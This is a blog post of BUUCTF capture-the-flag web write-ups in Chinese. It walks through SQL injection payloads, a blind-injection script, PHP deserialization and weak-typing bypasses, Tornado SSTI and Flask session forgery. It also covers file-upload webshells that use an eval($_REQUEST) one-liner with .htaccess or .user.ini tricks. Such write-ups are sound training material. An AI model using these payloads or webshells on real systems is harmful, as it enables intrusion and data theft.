---
title: "BUUCTF Web Writeup 2"
date: 2022-08-24T22:00:41+08:00
lastmod: 2022-08-24T22:00:41+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

BUUCTF 刷题记录...

<!--more-->

## [ACTF2020 新生赛]BackupFile

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208221821094.png)

手工试出来 index.php.bak

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

弱类型转换

```
http://dacc2c9f-1fe9-44a7-a79a-6bff32b539cc.node4.buuoj.cn:81/?key=123
```

## [极客大挑战 2019]BuyFlag

右键源代码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208221833474.png)

访问 pay.php 右键源代码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208221834560.png)

还是弱类型

提交 404aaa 之后提示 `You must be a student from CUIT !!!`

Cookie 把 `user=0` 改成 `user=1`, post 再传入 `money=100000000`

 然后提示数字太长了... 改成 `money[]=100000000` 就行

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208221840904.png)

## [护网杯 2018]easy_tornado

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208232216217.png)

url 格式如下

```
http://211ce077-6c56-419a-afb4-c599c568ac43.node4.buuoj.cn:81/file?filename=/flag.txt&filehash=0e24e12b6089646e7071af7883716075
```

flag.txt

```
/flag.txt
flag in /fllllllllllllag
```

welcome.txt

```
/welcome.txt
render
```

hints.txt

```
/hints.txt
md5(cookie_secret+md5(filename))
```

考点应该是 ssti, 我们需要找到 cookie_secret 的值, 然后和 /fllllllllllllag 拼接构造 filehash, 这样才能正常查看 flag 内容

filehash 随便改了改, 跳转到了报错页面

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208232218445.png)

存在 ssti, 但过滤了很多, 只有 `.` 没有被过滤

在官方文档里搜了一下 cookie_secret

[https://tornado-zh.readthedocs.io/zh/latest/index.html](https://tornado-zh.readthedocs.io/zh/latest/index.html)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241407516.png)

看起来好像是 tornado 内部的变量, 不是用户自定义的

想到了 flask 的 config, tornado 应该也有类似的变量

继续在文档里搜索 `cookie_secret`, 没搜到...

换个思路, 去 tornado 的源码里面搜, 发现了下面这一行

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241413473.png)

`self.application.settings` 有点可疑, 继续搜试试

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241414736.png)

往上拉找到这个方法对应的类

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241416236.png)

RequestHandler 类, 但是利用 ssti 查看 `RequestHandler.settings` 的内容会报错

然后又去文档里找了找

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241419948.png)

发现 handler 可以查看当前的 RequestHandler 对象

于是 payload 如下

```
http://211ce077-6c56-419a-afb4-c599c568ac43.node4.buuoj.cn:81/error?msg={{handler.settings}}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208232235952.png)

md5 加密

```python
from hashlib import md5

cookie_secret = 'a1d17d00-1e5f-4911-925c-390d3b41d6b4'
filename = '/fllllllllllllag'
print(md5(cookie_secret+md5(filename).hexdigest()).hexdigest())
```

访问得到 flag

```
http://211ce077-6c56-419a-afb4-c599c568ac43.node4.buuoj.cn:81/file?filename=/fllllllllllllag&filehash=19e76ada6795b98e2d5615423e5a2efa
```

## [HCTF 2018]admin

这题一开始当成了 csrf , 重置密码改成 123 然后成功登进去以为自己做出来了

最后看 wp 才知道 admin 的密码就是 123...

登录框输入单引号报错, 但好像并没有注入

右上角可以注册用户

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241519396.png)

于是注册了个 test

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241520631.png)

post 可以发文章, 但是看不了

change password 的页面右键查看源代码有一处注释

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241521672.png)

到 GitHub 下载, 打开后发现是用 flask 做的

/app/routes.py 里有 session

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241521857.png)

/app/config.py 里能看到 secret_key

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241522325.png)

/app/templates/index.html

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241526843.png)

搜了一下发现 flask 可以伪造 session

>  flask 的 session 是存储在客户端 cookie 中的，而且 flask 仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而 flask 并没有提供加密操作，所以其 session 的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。

参考文章 [https://cbatl.gitee.io/2020/11/15/Flask-session/](https://cbatl.gitee.io/2020/11/15/Flask-session/)

利用脚本 [https://github.com/noraj/flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241524372.png)

替换 cookie 后刷新页面得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241525573.png)

看了 wp 发现还有另一种思路

> Unicode 欺骗

参考文章 [https://www.anquanke.com/post/id/164086](https://www.anquanke.com/post/id/164086)

原因在于使用了自定义的 strlower 函数

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241536110.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241537849.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241537424.png)

定义如下

```python
from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep
....

def strlower(username):
    username = nodeprep.prepare(username)
    return username
```

requirements.txt 里的 twisted 库版本

```
Twisted==10.2.0
```

百度搜到的相关内容都是 wp...

唯一一篇可能有联系的原始文章现在也已经打不开了

[https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e](https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e)

大意就是使用旧版本的 twisted 库中的 nodeprep 进行转换时, 会把一些 unicode 字符转换成对应的正常大写字符

例如使用两次 strlower 的结果,  `ᴬ  -> A -> a`

本地安装这个库的旧版本一直有问题, 可能是 Python 版本太新了

unicode 字符 [https://unicode-table.com/en/search/?q=small+capital](https://unicode-table.com/en/search/?q=small+capital)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241555758.png)

我们注册 `ᴬdmin` 用户, 注册时会进行一次 strtolower, 实际上存入数据库的是 Admin 用户

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241557830.png)

然后通过 `ᴬdmin` 登录, 登陆的时候出现也是把 post 的数据 strtolower 一下

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241557822.png)

之后修改密码, 因为修改密码的时候是把 `session['name']` 的内容 strtolower, 而前者的内容实际上是注册后已经 strtolower 了一次的 `Admin`, 第二次 strtolower 之后变成 admin, 修改的也就是 admin 的密码

最后登录得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241559904.png)

## [BJDCTF2020]Easy MD5

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241603590.png)

抓包查看返回头

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241603275.png)

`md5($pass, true)`, 其实就是生成了二进制的摘要, 之前也遇到过

```
ffifdyop
129581926211651571912466741651878684928
```

这两个 payload md5 加密后生成的二进制字符里包含万能密码

输入提交

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241605370.png)

右键查看源代码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241605865.png)

md5 0e 漏洞

```
http://b7c25771-6bbd-44e3-ac5d-5ead5de06174.node4.buuoj.cn:81/levels91.php?a=QNKCDZO&b=240610708
```

之后又跳转到一个页面

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241607562.png)

强类型比较, 0e 开头的字符串不会被自动转换成科学计数法了

但是可以换成数组绕过, 之前也遇到过

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241612093.png)

## [ZJCTF 2019]NiZhuanSiWei

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

php://input 好像用不了, 先用 php://filter 读文件试试

```
http://919e7ced-6038-437a-891f-49bebb325a20.node4.buuoj.cn:81/?text=data://text/plain,welcome to the zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php
```

useless.php

```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

反序列化

```
http://919e7ced-6038-437a-891f-49bebb325a20.node4.buuoj.cn:81/?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

右键查看得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241622090.png)

## [MRCTF2020]你传你🐎呢

文件上传

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241629766.png)

测试发现过滤了 php phtml 等后缀, 但是 .htaccess 能够上传

```html
<IfModule mime_module>
AddType application/x-httpd-php .jpg
</IfModule>
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241629153.png)

思路就很明显了, 之后再传一个包含一句话的 jpg 就行

不过每次上传的路径都不一样...

观察了一下发现每次上传后会给你设置一个 PHPSESSID, 如果你继续拿着这个 cookie 上传的话文件夹就不会变

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241632967.png)

最后蚁剑链接查看 flag

## [极客大挑战 2019]HardSQL

and or 空格和等于号都被过滤了

空格绕过用注释, `%0a` `%09` 等等都不行

看了 wp 才知道是利用异或 `^` + xpath 报错注入

参考文章 [https://blog.csdn.net/V1040375575/article/details/111712453](https://blog.csdn.net/V1040375575/article/details/111712453)

异或的特性

> a ^ b, 如果 a, b 两个值不相同, 则结果为 1, 如果 a, b 两个值相同, 则结果为 0

mysql 的异或有两个操作符, `^` 和 `XOR`, 前者为按位异或, 后者为逻辑异或

按位异或会把数字或者强制类型转换的字符串 (跟 PHP 类似) 转换成二进制, 然后每一位进行逻辑异或, 最后得出来一个新的数字

逻辑异或只是单纯的根据两边的真假性来得出结果

下面是一个利用异或来进行盲注的示例

```mysql
mysql> use test;
Database changed
mysql> select * from flag;
+------+------------+
| id   | flag       |
+------+------------+
|    1 | flag{test} |
+------+------------+
1 row in set (0.00 sec)

mysql> select * from flag where id=1^(length(database())=4);
Empty set (0.00 sec)

mysql> select * from flag where id=1^(length(database())=3);
+------+------------+
| id   | flag       |
+------+------------+
|    1 | flag{test} |
+------+------------+
1 row in set (0.00 sec)
```

第一条语句后面是 `1^1=0`, 表中没有 id=0 的记录, 所以返回空

第二条语句后面是 `1^0=1`, 故能查询到 id=1 的记录并返回

不过这题没有利用到异或具体的性质, 只是用来替代 and 作为连接符

```
http://ea01a9bb-14f1-4641-b8b8-600e03eb7a04.node4.buuoj.cn:81/check.php
?username=admin'^extractvalue(1,concat(0x7e,(database()),0x7e))%23
&password=123
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241751641.png)

substr mid 被过滤了, 利用 left 和 right 从两边截取 31 位字符, 然后手工拼接一下

```
http://ea01a9bb-14f1-4641-b8b8-600e03eb7a04.node4.buuoj.cn:81/check.php
?username=admin'^extractvalue(1,concat(0x7e,(select(left(password,31))from(H4rDsq1)where(username)like('flag')),0x7e))%23
&password=123

http://ea01a9bb-14f1-4641-b8b8-600e03eb7a04.node4.buuoj.cn:81/check.php
?username=admin'^extractvalue(1,concat(0x7e,(select(right(password,31))from(H4rDsq1)where(username)like('flag')),0x7e))%23
&password=123
```

## [SUCTF 2019]CheckIn

考察 .user.ini

上传文件后发现目录下存在一个 index.php

于是先上传一个 1.txt 内容如下 (`<?` 被过滤了)

```html
GIF89a
<script language="php">eval($_REQUEST[1]);</script>
```

再上传 .user.ini

```ini
GIF89a
auto_append_file="1.txt"
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241807495.png)

最后访问 /uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php

连接得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241808331.png)

## [MRCTF2020]Ez_bypass

```php
I put something in F12 for you
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
}Please input first
```

md5 数组绕过和弱类型转换

```
http://f1edb72b-630a-48cf-bab2-ee13086b4ee5.node4.buuoj.cn:81/?gg[]=123&id[]=456

post: passwd=1234567a
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241813346.png)

## [网鼎杯 2020 青龙组]AreUSerialz

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

思路是令 op 的值为 2 并且指定 filename 为 flag.php 从而读取 flag 的内容

但是 __destruct 前有个判断, 会更改 op 的值并清空 content

然而里面的  `if($this->op === "2")` 用的是 `===`, 也就是强类型比较

process 里面的 `else if($this->op == "2")` 用的是 `==`, 弱类型比较

所以我们只需要把 op 设置成 int 类型的就能绕过了

payload 如下

```php
<?php

class FileHandler {

    public $op = 2;
    public $filename = 'flag.php';
    public $content = '';

}

echo urlencode(serialize(new FileHandler()));
?>
```

如果访问修饰符是 protected 和 private 的话, 生成的字符串有 `%00`, 会被 is_valid 检测到

不过服务器的 PHP 版本是 7.4.3, 对访问修饰符不敏感, 全都改成 public 即可

```
http://022ddad7-d409-497d-9954-a37f4c6962f3.node4.buuoj.cn:81/?str=O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A7%3A%22content%22%3Bs%3A0%3A%22%22%3B%7D
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241918523.png)

## [GXYCTF2019]BabySQli

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241934726.png)

提交 1 1 显示 `wrong user!`, 提交 admin 1 显示 `wrong pass!`

name 提交单引号报错, 但是 pw 不会

过滤了 or 和括号... 常规的 SQL 注入怎么说也得要括号吧

右键源代码发现一处注释

```html
<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
```

先 base32 解密再 base64 解密, 内容如下

```sql
select * from user where username = '$name'
```

注意他的检测方式不是 username 和 password 一起查的, 而是先查 username, 然后对比执行结果中的 password 和 post 传入的 pw 是否相等

联想到了之前在 CG-CTF 做过的一处 union 注入

具体例子如下

```mysql
mysql> select * from users where username='admin';
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  8 | admin    | admin    |
+----+----------+----------+
1 row in set (0.00 sec)

mysql> select * from users where username='1';
Empty set (0.00 sec)

mysql> select * from users where username='1' union select 1,'admin','admin';
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | admin    | admin    |
+----+----------+----------+
1 row in set (0.00 sec)
```

前面构造不存在的内容让结果返回空, 后面再用 union 构造一组新的数据, 这样的出来的结果就跟正常的 select 结果一模一样了

测试的时候 pw 提交单引号不报错, 猜测可能是 md5 加密, payload 如下

```
name=1' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241947059.png)

## [GXYCTF2019]BabyUpload

简单文件上传

考察 .htaccess 和 `<script language="php">xx</script>`

和之前有一题差不多, 记得设置 cookie

## [GYCTF2020]Blacklist

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208241959805.png)

过滤内容如下

```php
return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```

handler 注入

```
http://215e031d-2bb6-4870-b01d-6fb4cfa685c5.node4.buuoj.cn:81/
?inject=1';handler FlagHere open;handler FlagHere read first;#
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208242048413.png)

## [CISCN2019 华北赛区 Day2 Web1]Hack World

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208242114225.png)

数字型盲注, 过滤了空格 and or 这些

`=` + 括号绕过

```sql
id=1=if(ascii(substr((select(flag)from(flag)),1,1))=102,1,0)
```

因为 `-` 也被过滤了, 所以还是转成 ascii 方便一些

python 脚本

```python
import time
import requests

dicts='flag{bcde-1234567890}'

url = 'http://e22b868b-c929-4bad-8e3f-1362d21e37d3.node4.buuoj.cn:81/index.php'

flag = ''

for i in range(100):
    for s in dicts:
        time.sleep(1)
        data = {
            'id': f"1=if(ascii(substr((select(flag)from(flag)),{i},1))={ord(s)},1,0)"
        }
        #print('test',s)
        res = requests.post(url,data=data, timeout=30)
        if 'glzjin' in res.text:
            flag += s
            print(flag)
            break
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208242201451.png)
